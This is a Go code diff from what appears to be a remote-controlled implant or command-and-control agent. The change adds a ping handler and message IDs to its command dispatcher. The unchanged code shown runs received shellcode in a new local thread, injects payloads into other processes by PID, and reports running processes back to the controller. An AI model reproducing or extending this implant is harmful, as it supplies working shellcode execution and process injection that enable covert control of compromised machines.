@@ -14,6 +14,7 @@ var (
 		"task":       taskHandler,
 		"remoteTask": remoteTaskHandler,
 		"psReq":      psHandler,
+		"ping":       pingHandler,
 	}
 )
 
@@ -22,12 +23,29 @@ func getSystemHandlers() map[string]interface{} {
 }
 
 // ---------------- Handlers ----------------
+func pingHandler(send chan pb.Envelope, data []byte) {
+	ping := &pb.Ping{}
+	err := proto.Unmarshal(data, ping)
+	if err != nil {
+		log.Printf("error decoding message: %v", err)
+		return
+	}
+	log.Printf("ping id = %s", ping.Id)
+	data, _ = proto.Marshal(ping)
+	envelope := pb.Envelope{
+		Id:   ping.Id,
+		Type: "ping",
+		Data: data,
+	}
+	send <- envelope
+}
+
 func taskHandler(send chan pb.Envelope, data []byte) {
 
 	task := &pb.Task{}
 	err := proto.Unmarshal(data, task)
 	if err != nil {
-		log.Printf("Error decoding message: %v", err)
+		log.Printf("error decoding message: %v", err)
 		return
 	}
 
@@ -37,7 +55,7 @@ func taskHandler(send chan pb.Envelope, data []byte) {
 	for index := 0; index < size; index++ {
 		buf[index] = task.Data[index]
 	}
-	log.Printf("Creating local thread with start address: %v", addr)
+	log.Printf("creating local thread with start address: 0x%08x", addr)
 	createThread.Call(0, 0, addr, 0, 0, 0)
 }
 
@@ -45,7 +63,7 @@ func remoteTaskHandler(send chan pb.Envelope, data []byte) {
 	remoteTask := &pb.RemoteTask{}
 	err := proto.Unmarshal(data, remoteTask)
 	if err != nil {
-		log.Printf("Error decoding message: %v", err)
+		log.Printf("error decoding message: %v", err)
 		return
 	}
 	remoteThreadTaskInjection(int(remoteTask.Pid), remoteTask.Data)
@@ -55,12 +73,12 @@ func psHandler(send chan pb.Envelope, data []byte) {
 	psListReq := &pb.ProcessListReq{}
 	err := proto.Unmarshal(data, psListReq)
 	if err != nil {
-		log.Printf("Error decoding message: %v", err)
+		log.Printf("error decoding message: %v", err)
 		return
 	}
 	procs, err := Processes()
 	if err != nil {
-		log.Printf("Failed to list procs %v", err)
+		log.Printf("failed to list procs %v", err)
 	}
 
 	psList := &pb.ProcessList{
@@ -77,6 +95,7 @@ func psHandler(send chan pb.Envelope, data []byte) {
 	}
 	data, _ = proto.Marshal(psList)
 	envelope := pb.Envelope{
+		Id:   psListReq.Id,
 		Type: "psList",
 		Data: data,
 	}
